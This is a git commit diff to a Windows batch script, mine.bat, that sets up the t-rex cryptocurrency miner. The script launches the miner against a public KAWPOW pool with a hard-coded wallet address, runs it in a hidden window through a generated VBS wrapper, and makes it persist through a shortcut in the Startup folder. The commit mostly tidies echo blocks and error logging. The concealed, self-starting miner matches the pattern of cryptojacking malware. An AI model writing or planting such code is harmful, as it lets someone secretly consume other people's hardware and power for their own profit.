8076c22ae1c2b9c5229107e7a94f58bc64ea592c
Tejasvi Sharma <134033214+iemtejasvi@users.noreply.github.com>
2025-02-18 12:22:10 +0530

    mine.bat

--- mine.bat
+++ mine.bat
@@ -13,20 +13,24 @@ mkdir "%MINER_DIR%" 2>nul
 
 :: Ensure t-rex.exe exists
 if not exist "%MINER_EXEC%" (
-    echo ERROR: t-rex.exe not found in "%MINER_DIR%"!
+    echo ERROR: t-rex.exe not found in "%MINER_DIR%"! > "%MINER_DIR%\miner_error.log"
     exit /b
 )
 
-:: Write miner script (ensuring absolute path)
-echo @echo off > "%MINER_SCRIPT%"
-echo cd /d "%MINER_DIR%" >> "%MINER_SCRIPT%"
-echo :loop >> "%MINER_SCRIPT%"
-echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop) >> "%MINER_SCRIPT%"
-echo start /b "%MINER_EXEC%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe >> "%MINER_SCRIPT%"
+:: Write miner script (ensuring absolute path and correct execution)
+(
+    echo @echo off
+    echo cd /d "%MINER_DIR%"
+    echo :loop
+    echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop)
+    echo start /b "" "%MINER_EXEC%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe
+) > "%MINER_SCRIPT%"
 
 :: Write VBS script to run miner in hidden mode
-echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
-echo WshShell.Run """%MINER_SCRIPT%""", 0, False >> "%VBS_SCRIPT%"
+(
+    echo Set WshShell = CreateObject("WScript.Shell")
+    echo WshShell.Run """%MINER_SCRIPT%""", 0, False
+) > "%VBS_SCRIPT%"
 
 :: Create a shortcut in the Startup folder
 powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_SHORTCUT%'); $s.TargetPath='wscript.exe'; $s.Arguments='""%VBS_SCRIPT%""'; $s.Save()"
